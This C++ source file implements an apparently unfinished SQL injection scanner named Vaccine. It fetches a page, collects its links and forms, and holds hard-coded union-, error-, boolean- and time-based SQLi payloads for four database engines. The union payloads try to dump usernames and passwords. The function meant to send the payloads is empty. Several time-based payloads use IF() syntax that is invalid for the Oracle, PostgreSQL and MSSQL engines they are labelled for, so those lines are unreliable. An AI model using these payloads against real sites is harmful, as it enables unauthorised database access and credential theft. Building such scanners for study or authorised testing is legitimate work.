#include "../../include/class/Vaccine.hpp"

Vaccine::Vaccine()
{
        this->_url = std::string();
        this->_request_type = std::string();
        this->_archive_file = std::string();
        this->_headers = std::vector< std::string >();

        this->_html = std::string();
        this->_links = std::vector< xmlNode* >();
        this->_forms = std::vector< xmlNode* >();
}

Vaccine::Vaccine(const std::string& url, const std::string& archive_file, const std::string& request_type, const std::vector< std::string >& headers)
{
        this->_url = url;
        this->_archive_file = archive_file;
        this->_request_type = request_type;
        this->_headers = headers;

        this->_html = std::string();
        this->_links = std::vector< xmlNode* >();
        this->_forms = std::vector< xmlNode* >();
}

Vaccine::Vaccine(const Vaccine& other)
{
        *this = other;
}

Vaccine::~Vaccine()
{
}

Vaccine& Vaccine::operator=(const Vaccine& other)
{
        if (this != &other)
        {
                this->_url = other._url;
                this->_request_type = other._request_type;
                this->_archive_file = other._archive_file;
                this->_headers = other._headers;

                this->_html = other._html;
                this->_links = other._links;
                this->_forms = other._forms;
        }
        return *this;
}

const std::string& Vaccine::get_url() const
{
        return this->_url;
}

const std::string& Vaccine::get_request_type() const
{
        return this->_request_type;
}

const std::string& Vaccine::get_archive_file() const
{
        return this->_archive_file;
}

const std::vector< std::string >& Vaccine::get_headers() const
{
        return this->_headers;
}

const std::string& Vaccine::get_html() const
{
        return this->_html;
}

const std::vector< xmlNode* >& Vaccine::get_links() const
{
        return this->_links;
}

const std::vector< xmlNode* >& Vaccine::get_forms() const
{
        return this->_forms;
}

void Vaccine::set_url(const std::string& url)
{
        this->_url = url;
}

void Vaccine::set_request_type(const std::string& request_type)
{
        this->_request_type = request_type;
}

void Vaccine::set_archive_file(const std::string& archive_file)
{
        this->_archive_file = archive_file;
}

void Vaccine::set_headers(const std::vector< std::string >& headers)
{
        this->_headers = headers;
}

bool Vaccine::fetch_data()
{
        if (this->_html.empty() && !this->_curl_url())
                return false;

        htmlDocPtr doc = htmlReadMemory(this->_html.c_str(), this->_html.size(), "noname.html", NULL, HTML_PARSE_RECOVER | HTML_PARSE_NOERROR | HTML_PARSE_NOWARNING);
        if (!doc)
        {
                std::cerr << "Vaccine: [ ERROR ] Could not parse html." << std::endl;
                return false;
        }
        this->_parse_html(xmlDocGetRootElement(doc));
        xmlFreeDoc(doc);
        xmlCleanupParser();
        return true;
}

void Vaccine::union_based_sqli() const
{
        if (!this->_data_check())
                return;

        const std::string oracle_payload = "' UNION SELECT NULL, username, password FROM all_users--";
        const std::string mySQL_paylaod = "' UNION SELECT NULL, username, password FROM users--";
        const std::string postgreSQL_payload = "' UNION SELECT NULL, username, password FROM pg_catalog.pg_user--";
        const std::string microsoftSQL_payload = "' UNION SELECT NULL, username, password FROM sys.syslogins--";

        this->_process(oracle_payload);
        this->_process(mySQL_paylaod);
        this->_process(postgreSQL_payload);
        this->_process(microsoftSQL_payload);
}

void Vaccine::error_based_sqli() const
{
        if (!this->_data_check())
                return;

        const std::string oracle_payload = "' OR 1=UTL_INADDR.get_host_address((SELECT user FROM dual))--";
        const std::string mySQL_paylaod = "' OR 1=EXTRACTVALUE('<a>','<a>'|| (SELECT @@version) ||'</a>')--";
        const std::string postgreSQL_payload = "' OR 1=cast((SELECT version()) as integer)--";
        const std::string microsoftSQL_payload = "' OR 1=CONVERT(int, (SELECT @@version))--";

        this->_process(oracle_payload);
        this->_process(mySQL_paylaod);
        this->_process(postgreSQL_payload);
        this->_process(microsoftSQL_payload);
}

void Vaccine::boolean_based_sqli() const
{
        if (!this->_data_check())
                return;

        const std::string oracle_payload = "' OR 1=1--";
        const std::string mySQL_paylaod = "' OR 1=1--";
        const std::string postgreSQL_payload = "' OR 1=1--";
        const std::string microsoftSQL_payload = "' OR 1=1--";

        this->_process(oracle_payload);
        this->_process(mySQL_paylaod);
        this->_process(postgreSQL_payload);
        this->_process(microsoftSQL_payload);
}

void Vaccine::time_based_sqli() const
{
        if (!this->_data_check())
                return;

        const std::string oracle_payload = "' OR IF(DBMS_PIPE.RECEIVE_MESSAGE('a', 5) = 0, 0, 1)--";
        const std::string mySQL_paylaod = "' OR IF(1=1, SLEEP(5), 0)--";
        const std::string postgreSQL_payload = "' OR IF(1=1, pg_sleep(5), 0)--";
        const std::string microsoftSQL_payload = "' OR IF(1=1, WAITFOR DELAY '00:00:05', 0)--";

        this->_process(oracle_payload);
        this->_process(mySQL_paylaod);
        this->_process(postgreSQL_payload);
        this->_process(microsoftSQL_payload);
}

bool Vaccine::_curl_url()
{
        CURL* curl;
        CURLcode res;
        curl = curl_easy_init();
        if (curl)
        {
                curl_easy_setopt(curl, CURLOPT_URL, this->_url.c_str());
                curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
                curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, Vaccine::_curl_callback);
                curl_easy_setopt(curl, CURLOPT_WRITEDATA, &this->_html);
                res = curl_easy_perform(curl);
                if (res != CURLE_OK)
                {
                        std::cerr << "Vaccine: [ ERROR ] " << curl_easy_strerror(res) << std::endl;
                        return false;
                }
                curl_easy_cleanup(curl);
        }
        else
        {
                std::cerr << "Vaccine: [ ERROR ] Could not initialize curl." << std::endl;
                return false;
        }
        return true;
}

void Vaccine::_parse_html(xmlNode* node)
{
        for (node; node; node = node->next)
        {
                if (node->type == XML_ELEMENT_NODE)
                {
                        if (!xmlStrcasecmp(node->name, reinterpret_cast< const xmlChar* >("a")))
                                this->_links.push_back(node);
                        if (!xmlStrcasecmp(node->name, reinterpret_cast< const xmlChar* >("form")))
                                this->_forms.push_back(node);
                }
                this->_parse_html(node->children);
        }
}

bool Vaccine::_data_check() const
{
        if (this->_html.empty())
        {
                std::cerr << "Vaccine: [ ERROR ] Please fetch_data() first." << std::endl;
                return false;
        }
        if (this->_links.empty() && this->_forms.empty())
        {
                std::cout << "Vaccine: [ INFO ] " << this->_url << " has no managed SQLi entrypoint." << std::endl;
                return false;
        }
        return true;
}

void Vaccine::_process(const std::string& payload) const
{
}

size_t Vaccine::_curl_callback(char* ptr, size_t size, size_t nmemb, void* buffer)
{
        ((std::string*)buffer)->append((char*)ptr, size * nmemb);
        return size * nmemb;
}
